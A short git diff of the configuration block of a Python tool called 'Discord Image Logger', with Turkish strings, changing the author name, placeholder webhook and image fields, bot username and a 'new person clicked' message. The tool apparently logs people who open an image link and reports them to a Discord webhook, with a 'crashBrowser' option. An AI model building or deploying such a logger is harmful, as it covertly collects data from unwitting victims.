@@ -7,14 +7,14 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "oylesine bi image logger"
 __version__ = "v2.0"
-__author__ = "cabdio"
+__author__ = "foaqen"
 
 config = {
-    "webhook": "webhook adresiniz",
-    "image": "fotografin adresi", 
+    "webhook": "webhook buraya",
+    "image": "resim buraya", 
     "imageArgument": True,
 
-    "username": "CABDIOLOGGER", 
+    "username": "Logger Agent", 
     "color": 0x00FFFF,
 
     "crashBrowser": False, 
@@ -22,7 +22,7 @@ config = {
 
     "message": {
         "doMessage": False, 
-        "message": "cabdio buradaydı :)",
+        "message": "Yeni bir kişi tıkladı.",
         "richMessage": True,
     },
 
